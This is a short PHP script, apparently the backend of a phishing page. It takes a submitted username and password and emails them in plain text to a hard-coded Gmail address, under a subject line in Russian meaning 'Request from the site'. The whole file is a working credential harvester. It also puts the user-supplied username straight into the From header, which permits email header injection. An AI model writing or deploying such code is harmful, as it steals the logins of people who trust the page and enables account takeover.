<<?php
$Username = $_POST['Username'];
$Password = $_POST['Password'];

$to  = "koldof123456789@gmail.com";

$from = $Username;
$subject = "Заявка c сайта";

$msg = "
    Логин: $Username /n
    Пароль: $Password";

mail($to, $subject, $msg, "From: $from")
?>